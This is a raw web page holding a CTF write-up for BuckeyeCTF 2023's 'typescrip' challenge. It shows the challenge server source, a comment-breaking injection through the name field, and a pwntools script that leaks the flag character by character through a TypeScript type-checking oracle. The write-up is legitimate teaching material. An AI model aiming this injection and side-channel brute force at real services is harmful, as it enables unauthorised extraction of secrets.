string">&#x27;o&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;p&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;q&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;r&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;s&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;t&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;u&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;v&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;w&#x27;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">8</span><span class="">    </span><span class="token string">&#x27;x&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;y&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;z&#x27;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class="">    </span><span class="token string">&#x27;1&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;2&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;3&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;4&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;5&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;6&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;7&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;8&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;9&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;0&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;_&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;$&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;@&#x27;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">10</span><span class=""></span><span class="token punctuation">]</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">11</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class=""></span><span class="token keyword">while</span><span class=""> </span><span class="token boolean">True</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">13</span><span class="">    </span><span class="token keyword">for</span><span class=""> letter </span><span class="token keyword">in</span><span class=""> letters</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">14</span><span class="">        conn </span><span class="token operator">=</span><span class=""> pwn</span><span class="token punctuation">.</span><span class="">remote</span><span class="token punctuation">(</span><span class="token string">&#x27;chall.pwnoh.io&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token number">13381</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">15</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">16</span><span class="">        </span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="">conn</span><span class="token punctuation">.</span><span class="">recvline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">17</span><span class="">        conn</span><span class="token punctuation">.</span><span class="">send</span><span class="token punctuation">(</span><span class="token string">b&#x27;*/foo(`\n&#x27;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">18</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">19</span><span class="">        </span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="">conn</span><span class="token punctuation">.</span><span class="">recvline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">20</span><span class="">        conn</span><span class="token punctuation">.</span><span class="">recv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">21</span><span class="">        conn</span><span class="token punctuation">.</span><span class="">send</span><span class="token punctuation">(</span><span class="token string">b&#x27;`)\n&#x27;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">22</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">23</span><span class="">        conn</span><span class="token punctuation">.</span><span class="">recv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">24</span><span class="">        code </span><span class="token operator">=</span><span class=""> </span><span class="token string">&#x27;function foo(x: `${string}bctf{&#x27;</span><span class=""> </span><span class="token operator">+</span><span class=""> flag </span><span class="token operator">+</span><span class=""> letter </span><span class="token operator">+</span><span class=""> </span><span class="token string">&#x27;${string}}${string}`) {}\n&#x27;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">25</span><span class="">        conn</span><span class="token punctuation">.</span><span class="">send</span><span class="token punctuation">(</span><span class="">code</span><span class="token punctuation">.</span><span class="">encode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">26</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">27</span><span class="">        conn</span><span class="token punctuation">.</span><span class="">recv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">28</span><span class="">        conn</span><span class="token punctuation">.</span><span class="">send</span><span class="token punctuation">(</span><span class="token string">b&#x27;\n\n\n\n&#x27;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">29</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">30</span><span class="">        </span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="">conn</span><span class="token punctuation">.</span><span class="">recvline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">31</span><span class="">        res </span><span class="token operator">=</span><span class=""> conn</span><span class="token punctuation">.</span><span class="">recvline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">32</span><span class="">        </span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="">res</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">33</span><span class="">        </span><span class="token keyword">if</span><span class=""> res </span><span class="token operator">==</span><span class=""> </span><span class="token string">b&#x27;Congrats, your code is perfect\n&#x27;</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">34</span><span class="">            flag </span><span class="token operator">+=</span><span class=""> letter
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">35</span><span class="">            </span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation string">f&#x27;bctf{{</span><span class="token string-interpolation interpolation punctuation">{</span><span class="token string-interpolation interpolation">flag</span><span class="token string-interpolation interpolation punctuation">}</span><span class="token string-interpolation string">}}&#x27;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">36</span><span class="">            </span><span class="token keyword">break</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">37</span><span class="">        </span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">38</span><span class="">            </span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="">letter</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">39</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">40</span><span class="">        conn</span><span class="token punctuation">.</span><span class="">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">41</span><span class="">    </span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">42</span><span class="">        </span><span class="token keyword">break</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">43</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">44</span><span class=""></span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation string">f&#x27;bctf{{</span><span class="token string-interpolation interpolation punctuation">{</span><span class="token string-interpolation interpolation">flag</span><span class="token string-interpolation interpolation punctuation">}</span><span class="token string-interpolation string">}}&#x27;</span><span class="token punctuation">)</span></code></pre></div></div></main></div><!--$--><!--/$--></main><script src="/_next/static/chunks/webpack-d11e0b30904b49ad.js" id="_R_" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:I[87555,[],\"\"]\n3:I[31295,[],\"\"]\n4:I[6874,[\"874\",\"static/chunks/874-3e820bd666038662.js\",\"633\",\"static/chunks/app/writeups/%5Bid%5D/layout-2577bd3482649595.js\"],\"\"]\n6:I[59665,[],\"OutletBoundary\"]\n8:I[74911,[],\"AsyncMetadataOutlet\"]\na:I[59665,[],\"ViewportBoundary\"]\nc:I[59665,[],\"MetadataBoundary\"]\nd:\"$Sreact.suspense\"\nf:I[28393,[],\"\"]\n:HL[\"/_next/static/media/e4af272ccee01ff0-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/css/94afdc017676131d.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"jUDimr6wyOJvYNMJ2n6_v\",\"p\":\"\",\"c\":[\"\",\"writeups\",\"a851fdabc90d887a61af81c071f6f0ce\"],\"i\":false,\"f\":[[[\"\",{\"children\":[\"writeups\",{\"children\":[[\"id\",\"a851fdabc90d887a61af81c071f6f0ce\",\"d\"],{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",true],[\"\",[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/94afdc017676131d.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"className\":\"dark scroll-smooth\",\"children\":[[\"$\",\"head\",null,{\"children\":[\"$\",\"meta\",null,{\"charSet\":\"utf-8\"}]}],[\"$\",\"body\",null,{\"className\":\"text-dark dark:text-white dark:bg-midnight\",\"style\":{\"fontFamily\":\"'Inter', 'Inter Fallback'\",\"fontStyle\":\"normal\"},\"children\":[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[\"$\",\"div\",null,{\"className\":\"h-screen flex items-center justify-center\",\"children\":[\"$\",\"main\",null,{\"className\":\"relative pl-14\",\"children\":[[\"$\",\"svg\",null,{\"stroke\":\"currentColor\",\"fill\":\"currentColor\",\"strokeWidth\":\"0\",\"viewBox\":\"0 0 512 512\",\"className\":\"absolute left-0 top-2 text-5xl text-grapefruit\",\"children\":[\"$undefined\",[[\"$\",\"path\",\"0\",{\"d\":\"M256 48C140.559 48 48 140.559 48 256c0 115.436 92.559 208 208 208 115.435 0 208-92.564 208-208 0-115.441-92.564-208-208-208zm104.002 282.881l-29.12 29.117L256 285.117l-74.881 74.881-29.121-29.117L226.881 256l-74.883-74.881 29.121-29.116L256 226.881l74.881-74.878 29.12 29.116L285.119 256l74.883 74.881z\",\"children\":\"$undefined\"}]]],\"style\":{\"color\":\"$undefined\"},\"height\":\"1em\",\"width\":\"1em\",\"xmlns\":\"http://www.w3.org/2000/svg\"}],[\"$\",\"h1\",null,{\"className\":\"font-bold text-7xl underline decoration-grapefruit mb-5\",\"children\":\"404.\"}],[\"$\",\"p\",null,{\"children\":\"Your requested page was not found.\"}],[\"$\",\"$L4\",null,{\"href\":\"/\",\"className\":\"font-medium text-inherit\",\"children\":\"Return to home →\"}]]}]}],[]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]]}]]}],{\"children\":[\"writeups\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"main\",null,{\"className\":\"container pt-20 pb-24\",\"children\":[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]]}],{\"children\":[[\"id\",\"a851fdabc90d887a61af81c071f6f0ce\",\"d\"],[\"$\",\"$1\",\"c\",{\"children\":[null,[[\"$\",\"$L4\",null,{\"href\":\"/writeups\",\"className\":\"text-secondary text-sm mb-10 -ml-5 block w-max\",\"children\":\"← Back to writeups\"}],[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]]}],{\"children\":[\"__PAGE__\",[\"$\",\"$1\",\"c\",{\"children\":[\"$L5\",null,[\"$\",\"$L6\",null,{\"children\":[\"$L7\",[\"$\",\"$L8\",null,{\"promise\":\"$@9\"}]]}]]}],{},null,false]},null,false]},null,false]},null,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[[\"$\",\"$La\",null,{\"children\":\"$Lb\"}],[\"$\",\"meta\",null,{\"name\":\"next-size-adjust\",\"content\":\"\"}]],[\"$\",\"$Lc\",null,{\"children\":[\"$\",\"div\",null,{\"hidden\":true,\"children\":[\"$\",\"$d\",null,{\"fallback\":null,\"children\":\"$Le\"}]}]}]]}],false]],\"m\":\"$undefined\",\"G\":[\"$f\",[]],\"s\":false,\"S\":true}\n"])</script><script>self.__next_f.push([1,"b:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"meta\",\"1\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\n7:null\n"])</script><script>self.__next_f.push([1,"10:I[50674,[\"325\",\"static/chunks/325-655a7b8ed93161e0.js\",\"134\",\"static/chunks/app/writeups/%5Bid%5D/page-bcc47f65bcf2ff4c.js\"],\"default\"]\n11:T6aa,"])</script><script>self.__next_f.push([1,"import { createServer } from \"net\";\nimport { Project } from \"ts-morph\";\n\nconst flag = process.env.FLAG ?? \"bctf{fake_flag}\";\n\nfunction compile(source) {\n    const project = new Project({ useInMemoryFileSystem: true });\n    const sourceFile = project.createSourceFile(\"temp.ts\", source);\n    const diagnostics = sourceFile.getPreEmitDiagnostics();\n\n    return diagnostics.map(diagnostic =\u003e {\n        const severity = [\"Warning\", \"Error\", \"Suggestion\", \"Message\"][diagnostic.getCategory()];\n        return `${severity} on line ${diagnostic.getLineNumber()}`;\n    });\n}\n\nconst server = createServer(socket =\u003e {\n    socket.write(\"What is your name?\\n\u003e \");\n    socket.once(\"data\", data =\u003e {\n        const name = data.toString().trim();\n        socket.write(`Hello, ${name}. Give me some code: (end with blank line)\\n\u003e `);\n        let code = '';\n        let done = false;\n        socket.on('data', data =\u003e {\n            if (done) return;\n            const line = data.toString().trim();\n            if (!line) {\n                done = true;\n                socket.write('Thinking...\\n');\n\n                const today = new Date().toLocaleDateString('en-us');\n                const source = `/* TYPE CHECKED FOR ${name} ON ${today}. THE FLAG IS \"${flag}\". */` + \"\\n\\n\" + code;\n\n                const errors = compile(source);\n\n                if (errors.length === 0) {\n                    socket.write('Congrats, your code is perfect\\n');\n                } else {\n                    socket.write(errors.join('\\n') + '\\n');\n                }\n\n                socket.destroy();\n            }\n            if (!done) socket.write('\u003e ');\n\n            code += line + '\\n';\n        })\n    });\n});\n\nserver.listen(1024);"])</script><script>self.__next_f.push([1,"5:[\"$\",\"div\",null,{\"children\":[\"$\",\"main\",null,{\"className\":\"text-pretty max-w-5xl mx-auto text-sm [\u0026_h1]:text-5xl [\u0026_h1]:font-semibold [\u0026_h1]:mb-8 [\u0026_blockquote]:text-secondary [\u0026_blockquote]:space-y-3 [\u0026_blockquote]:border-l-4 [\u0026_blockquote]:border-secondary [\u0026_blockquote]:pl-5 [\u0026_blockquote]:mb-5 [\u0026\u003e_p]:my-4 [\u0026_img]:my-5 [\u0026_ul]:list-disc [\u0026_ul]:pl-6 [\u0026_ol]:list-decimal [\u0026_ol]:pl-6 [\u0026_img]:rounded [\u0026_li]:my-2\",\"children\":[[\"$\",\"h1\",\"h1-0\",{\"children\":\"BuckeyeCTF 2023 — typescrip\"}],\"\\n\",[\"$\",\"blockquote\",\"blockquote-0\",{\"children\":[\"\\n\",[\"$\",\"p\",\"p-0\",{\"children\":\"I like typescript. Do you like typescript?\"}],\"\\n\",[\"$\",\"p\",\"p-1\",{\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"nc chall.pwnoh.io 13381\"}]}],\"\\n\"]}],\"\\n\",[\"$\",\"p\",\"p-0\",{\"children\":\"We're given a JavaScript server that looks like this:\"}],\"\\n\",[\"$\",\"$L10\",\"pre-0\",{\"className\":\"my-2\",\"children\":\"$11\",\"language\":\"js\"}],\"\\n\",[\"$\",\"p\",\"p-1\",{\"children\":\"The server takes in a \\\"name\\\" and some code, then writes and type checks a TypeScript file resembling\"}],\"\\n\",[\"$\",\"$L10\",\"pre-1\",{\"className\":\"my-2\",\"children\":\"/* TYPE CHECKED FOR {name} ON 9/29/2023. THE FLAG IS \\\"bctf{some_flag}\\\". */\\n\\n// your code here\",\"language\":\"ts\"}],\"\\n\",[\"$\",\"p\",\"p-2\",{\"children\":[\"reporting back any compilation errors. Note that we don't get what the type errors \",[\"$\",\"em\",\"em-0\",{\"children\":\"are\"}],\", just whether they exist (and how many there are, and their line numbers).\"]}],\"\\n\",[\"$\",\"p\",\"p-3\",{\"children\":[\"The main idea is that we can brute force the flag based on whether compilation errors exist in the code. We can break out of the block comment by setting our \\\"name\\\" to \",[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"*/\"}],\", and store the flag in a (multiline) string using backticks:\"]}],\"\\n\",\"$L12\",\"\\n\",\"$L13\",\"\\n\",\"$L14\",\"\\n\",\"$L15\",\"\\n\",\"$L16\",\"\\n\",\"$L17\",\"\\n\",\"$L18\"]}]}]\n"])</script><script>self.__next_f.push([1,"12:[\"$\",\"$L10\",\"pre-2\",{\"className\":\"my-2\",\"children\":\"/* TYPE CHECKED FOR */foo(` ON 9/29/2023. THE FLAG IS \\\"bctf{some_flag}\\\". */\\n\\n`)\\nfunction foo(x: ...) {}\",\"language\":\"ts\"}]\n13:[\"$\",\"p\",\"p-4\",{\"children\":[\"Then, type check this string by passing it into the argument to \",[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"foo()\"}],\". We can use \",[\"$\",\"a\",\"a-0\",{\"href\":\"https://www.typescriptlang.org/docs/handbook/2/template-literal-types.html\",\"children\":\"template literal types\"}],\" to match the flag one character at a time:\"]}]\n14:[\"$\",\"img\",\"img-0\",{\"width\":541,\"alt\":\"image\",\"src\":\"https://user-images.githubusercontent.com/60120929/271787173-bec30743-e4d2-4446-9c53-ebac05d0bdb5.png\"}]\n15:[\"$\",\"img\",\"img-1\",{\"width\":960,\"alt\":\"image\",\"src\":\"https://user-images.githubusercontent.com/60120929/271787201-15c1a765-7c83-4eb0-b2de-f48a37f15e57.png\"}]\n16:[\"$\",\"p\",\"p-5\",{\"children\":\"If the code compiles, we know the character is in the flag, and can keep looping over characters until none match.\"}]\n17:[\"$\",\"p\",\"p-6\",{\"children\":\"Here's a quick and inefficient script that does just that:\"}]\n19:T47a,"])</script><script>self.__next_f.push([1,"import pwn\n\nflag = ''\nletters = [\n    'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W',\n    'X', 'Y', 'Z',\n    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w',\n    'x', 'y', 'z',\n    '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '_', '$', '@',\n]\n\nwhile True:\n    for letter in letters:\n        conn = pwn.remote('chall.pwnoh.io', 13381)\n\n        print(conn.recvline())\n        conn.send(b'*/foo(`\\n')\n\n        print(conn.recvline())\n        conn.recv()\n        conn.send(b'`)\\n')\n\n        conn.recv()\n        code = 'function foo(x: `${string}bctf{' + flag + letter + '${string}}${string}`) {}\\n'\n        conn.send(code.encode())\n\n        conn.recv()\n        conn.send(b'\\n\\n\\n\\n')\n\n        print(conn.recvline())\n        res = conn.recvline()\n        print(res)\n        if res == b'Congrats, your code is perfect\\n':\n            flag += letter\n            print(f'bctf{{{flag}}}')\n            break\n        else:\n            print(letter)\n\n        conn.close()\n    else:\n        break\n\nprint(f'bctf{{{flag}}}')"])</script><script>self.__next_f.push([1,"18:[\"$\",\"$L10\",\"pre-3\",{\"className\":\"my-2\",\"children\":\"$19\",\"language\":\"py\"}]\n"])</script><script>self.__next_f.push([1,"9:{\"metadata\":[[\"$\",\"title\",\"0\",{\"children\":\"BuckeyeCTF 2023 — typescrip | kevin.fish\"}],[\"$\",\"meta\",\"1\",{\"name\":\"description\",\"content\":\"I like typescript. Do you like typescript?\"}],[\"$\",\"meta\",\"2\",{\"property\":\"og:title\",\"content\":\"BuckeyeCTF 2023 — typescrip\"}],[\"$\",\"meta\",\"3\",{\"property\":\"og:description\",\"content\":\"I like typescript. Do you like typescript?\"}],[\"$\",\"meta\",\"4\",{\"name\":\"twitter:card\",\"content\":\"summary\"}],[\"$\",\"meta\",\"5\",{\"name\":\"twitter:title\",\"content\":\"BuckeyeCTF 2023 — typescrip\"}],[\"$\",\"meta\",\"6\",{\"name\":\"twitter:description\",\"content\":\"I like typescript. Do you like typescript?\"}]],\"error\":null,\"digest\":\"$undefined\"}\ne:\"$9:metadata\"\n"])</script></body></html>